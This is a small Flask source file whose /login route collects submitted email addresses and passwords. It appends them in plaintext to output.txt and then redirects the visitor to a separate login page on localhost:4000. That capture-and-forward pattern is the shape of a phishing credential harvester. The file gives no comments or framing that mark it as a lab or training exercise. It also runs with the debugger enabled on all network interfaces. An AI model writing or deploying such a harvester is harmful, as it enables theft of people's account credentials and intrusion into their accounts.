from flask import Flask
from flask import render_template, request, redirect
import re

app = Flask(__name__)

@app.route('/login', methods = ['GET','POST'])
def login():
    message = ""
    if request.method == 'POST' and 'email' in request.form and 'password' in request.form:
        values = {}
        values['email'] = request.form['email']
        values['password'] = request.form['password']
        message = str(values)
        out_file = open("output.txt", 'a')
        out_file.write(message)
        out_file.close()
        return redirect("http://localhost:4000/login")

    return render_template('login.html', message = message)

if __name__ == "__main__":
    app.run(debug=True,host='0.0.0.0')
